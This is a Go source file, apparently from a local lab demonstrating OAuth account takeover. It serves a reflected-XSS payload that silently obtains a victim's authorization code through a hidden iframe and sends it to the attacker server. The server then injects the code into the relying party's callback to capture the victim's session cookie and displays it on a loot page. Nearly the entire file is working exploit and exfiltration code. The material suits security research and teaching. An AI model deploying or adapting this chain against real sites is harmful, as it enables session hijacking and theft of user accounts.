// Attacker server for Scenario 2.
//
// Reflected-XSS payload -> silent `response_mode=fragment` code request
// (prompt=none) inside the RP origin -> victim's authorization `code` is read
// from the fragment and exfiltrated here.
//
// This server then performs authorization code INJECTION: it presents the
// stolen code to the RP's own /callback. The RP has no state binding, so its
// backend redeems the code (with the confidential client secret it holds) and
// returns a session cookie for the victim. We never see the secret or the
// tokens - we get something better, a logged-in session.
package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"sync"
)

const (
	attackerAddr = "127.0.0.1:9102"
	rpSearch     = "http://127.0.0.1:8102/search"
	rpCallback   = "http://127.0.0.1:8102/callback"
	rpMe         = "http://127.0.0.1:8102/api/me"
)

var (
	mu   sync.Mutex
	loot []string
)

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/", home)
	mux.HandleFunc("/payload.js", payloadJS)
	mux.HandleFunc("/collect", collect)
	mux.HandleFunc("/loot", showLoot)

	log.Printf("[s2 attacker] listening on http://%s", attackerAddr)
	log.Fatal(http.ListenAndServe(attackerAddr, mux))
}

func home(w http.ResponseWriter, r *http.Request) {
	inject := `<script src="http://127.0.0.1:9102/payload.js"></script>`
	link := rpSearch + "?q=" + urlEscape(inject)
	fmt.Fprintf(w, `<!doctype html><meta charset="utf-8">
<h1>Scenario 2 - attacker</h1>
<p>1. Victim must have an active Keycloak session (log in once at
   <a href="http://127.0.0.1:8102/login">the RP</a> as <code>victim</code>).</p>
<p>2. Send the victim this reflected-XSS link:</p>
<p><a href="%s">%s</a></p>
<p>3. Watch this console, then open <a href="/loot">/loot</a> - it shows the
   victim session cookie we obtained by injecting the stolen code.</p>
<hr><h3>Injected payload</h3><pre>%s</pre>`,
		htmlEscape(link), htmlEscape(link), htmlEscape(payloadSrc))
}

func payloadJS(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
	fmt.Fprint(w, payloadSrc)
}

// SSO gadget - runs in the RP origin (127.0.0.1:8102).
const payloadSrc = `
(function () {
  // Code flow, but forced into the fragment so the RP's server-side callback
  // never consumes it and injected JS on this origin can read it.
  var authURL =
    "http://127.0.0.1:8080/realms/xss-ato/protocol/openid-connect/auth" +
    "?client_id=s2-confidential" +
    "&response_type=code" +
    "&response_mode=fragment" +
    "&scope=" + encodeURIComponent("openid profile email") +
    "&redirect_uri=" + encodeURIComponent("http://127.0.0.1:8102/callback") +
    "&prompt=none" +
    "&state=" + Math.random().toString(36).slice(2);

  var f = document.createElement("iframe");
  f.style.position = "absolute"; f.style.left = "-9999px";
  f.width = 1; f.height = 1;
  f.src = authURL;
  f.onload = function () {
    var hash;
    try { hash = f.contentWindow.location.hash; } catch (e) {
      console.log("[xss] cannot read iframe", e); return;
    }
    var p = new URLSearchParams(hash.replace(/^#/, ""));
    var code = p.get("code");
    if (!code) {
      // e.g. #error=login_required -> victim has no active Keycloak session
      var err = p.get("error") || ("unexpected fragment: " + hash);
      console.log("[xss] no code:", err);
      new Image().src = "http://127.0.0.1:9102/collect?error=" + encodeURIComponent(err);
      return;
    }
    console.log("[xss] stole authorization code:", code.slice(0, 16) + "...");
    var img = new Image();
    img.src = "http://127.0.0.1:9102/collect?code=" + encodeURIComponent(code);
  };
  document.body.appendChild(f);
})();
`

func collect(w http.ResponseWriter, r *http.Request) {
	if e := r.URL.Query().Get("error"); e != "" {
		msg := "gadget FAILED: " + e +
			"\n  -> the victim has no active Keycloak session." +
			"\n  -> open http://127.0.0.1:8102/login as victim/victim first," +
			"\n     then re-open the XSS link. Also run keycloak/setup.sh if" +
			"\n     login itself says \"Invalid username or password\"."
		log.Println("[s2 attacker]", msg)
		mu.Lock()
		loot = append(loot, msg)
		mu.Unlock()
		fmt.Fprint(w, "noted")
		return
	}
	code := r.URL.Query().Get("code")
	if code == "" {
		http.Error(w, "no code", http.StatusBadRequest)
		return
	}
	log.Println("==================================================")
	log.Println("[s2 attacker] captured victim authorization code:")
	log.Println(code)

	cookie, err := injectCode(code)
	if err != nil {
		log.Println("[s2 attacker] injection failed:", err)
		fmt.Fprint(w, "fail")
		return
	}
	who := callMe(cookie)
	entry := "injected code, got RP session cookie:\n  " + cookie + "\n\n/api/me with that cookie:\n" + who
	mu.Lock()
	loot = append(loot, entry)
	mu.Unlock()
	log.Println("[s2 attacker] victim session cookie:", cookie)
	log.Println("[s2 attacker] /api/me says:\n" + who)
	log.Println("==================================================")
	fmt.Fprint(w, "ok")
}

// injectCode presents the stolen code to the RP's own /callback and captures
// the Set-Cookie the RP hands back.
func injectCode(code string) (string, error) {
	client := &http.Client{CheckRedirect: func(*http.Request, []*http.Request) error {
		return http.ErrUseLastResponse
	}}
	resp, err := client.Get(rpCallback + "?code=" + code + "&state=whatever")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	for _, c := range resp.Cookies() {
		if c.Name == "sid" {
			return "sid=" + c.Value, nil
		}
	}
	return "", fmt.Errorf("no sid cookie in RP response (%s)", resp.Status)
}

func callMe(cookie string) string {
	req, _ := http.NewRequest(http.MethodGet, rpMe, nil)
	req.Header.Set("Cookie", cookie)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return string(b)
}

func showLoot(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	defer mu.Unlock()
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	if len(loot) == 0 {
		fmt.Fprint(w, "nothing captured yet")
		return
	}
	for i, e := range loot {
		fmt.Fprintf(w, "--- capture %d ---\n%s\n\n", i+1, e)
	}
}

func urlEscape(s string) string {
	rep := strings.NewReplacer(" ", "%20", `"`, "%22", "<", "%3C", ">", "%3E")
	return rep.Replace(s)
}

func htmlEscape(s string) string {
	rep := strings.NewReplacer("<", "&lt;", ">", "&gt;", "&", "&amp;")
	return rep.Replace(s)
}
